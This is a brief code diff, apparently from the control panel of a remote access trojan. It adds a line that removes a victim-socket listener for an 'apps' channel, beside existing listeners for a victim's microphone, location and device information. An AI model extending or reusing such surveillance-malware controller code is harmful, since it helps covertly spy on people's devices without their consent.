@@ -251,6 +251,7 @@ ipcMain.on('openLabWindow', function (e, page, index) {
       victimsList.getVictim(index).socket.removeAllListeners("x0000mc"); // mic
       victimsList.getVictim(index).socket.removeAllListeners("x0000lm"); // location
       victimsList.getVictim(index).socket.removeAllListeners("x0000in"); // information
+      victimsList.getVictim(index).socket.removeAllListeners("x0000ia"); // apps
     }
   })
 });
